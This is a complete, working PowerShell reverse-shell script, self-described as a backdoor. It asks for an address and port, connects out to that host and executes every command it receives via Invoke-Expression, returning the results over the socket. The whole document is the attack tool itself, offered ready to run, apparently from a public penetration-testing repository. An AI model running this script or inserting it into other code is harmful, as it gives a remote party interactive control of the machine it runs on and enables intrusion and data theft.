$a = $(Read-Host -Prompt "Enter address").Trim(); if (-not $a) { Write-Host "Address is required"; exit 1; } $p = $(Read-Host -Prompt "Enter port number").Trim(); if (-not $p) { Write-Host "Port number is required"; exit 1; } Write-Host "PowerShell Reverse TCP v5.0 by Ivan Sincek."; Write-Host "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp."; $b = New-Object Byte[] 1024; $d = New-Object Text.StringBuilder; $r = New-Object Text.StringBuilder; try { $c = New-Object Net.Sockets.TcpClient($a, $p); $s = $c.GetStream(); $e = New-Object Text.UTF8Encoding; $w = New-Object IO.StreamWriter($s, $e, $b.Length); $w.AutoFlush = $true; Write-Host "Backdoor is up and running..."; do { $w.Write("PS>"); [void]$d.Clear(); do { $by = $s.Read($b, 0, $b.Length); if ($by -gt 0) { [void]$d.Append($e.GetString($b, 0, $by)); } } while ($s.DataAvailable); if ($d.Length -gt 0) { [void]$r.Clear(); try { [void]$r.Append($(Invoke-Expression -Command $d.ToString() 2>&1 | Out-String)); } catch { [void]$r.Append($_.Exception.Message); } $w.Write($r.ToString()); } } while ($by -gt 0); Write-Host "Backdoor will now exit..."; } catch { Write-Host "ERROR: $($_.Exception.Message)"; } finally { if ($w) { $w.Close(); $w.Dispose(); Clear-Variable "w"; } if ($s) { $s.Close(); $s.Dispose(); Clear-Variable "s"; } if ($c) { $c.Close(); $c.Dispose(); Clear-Variable "c"; } [void]$b.Clear(); Clear-Variable "b"; [void]$d.Clear(); Clear-Variable "d"; [void]$r.Clear(); Clear-Variable "r"; [GC]::Collect(); } Clear-Variable "a"; Clear-Variable "p";
